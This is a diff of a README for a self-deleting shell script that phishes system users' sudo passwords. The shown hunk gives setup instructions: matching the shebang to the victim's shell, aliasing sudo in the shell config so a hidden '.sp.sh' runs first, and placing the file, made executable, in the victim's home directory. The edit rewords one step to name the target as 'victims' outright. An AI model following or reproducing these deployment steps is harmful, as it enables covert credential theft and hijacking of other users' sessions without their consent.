@@ -8,8 +8,7 @@ A short self-destructive script to phish the passwords of the users on your syst
 + Self-destructs
 
 # How to set up manually
-+ Move everything to the home directory of the user if it isn't there already
 + Make sure you edit the shabang according to the users interactive SH. If they use bash, make sure the script starts with ```#!/bin/bash```, if they use zsh, then make sure it starts with ```#!/bin/zsh``` etc. It does not work with fish. Default is bash.
 + Set the ```$shellfile``` variable accordingly (line 21). Default is ```".bashrc"```
 + Put the following line at the END of the Shell config file: ``` alias sudo=".sp.sh; sudo" ```
-+ Rename the file to ```.sp.sh``` and give it executable permission with ```chmod +x .sp.sh```
++ Move the file to the victims home directory, rename it to ```.sp.sh``` and give it executable permission with ```chmod +x .sp.sh```
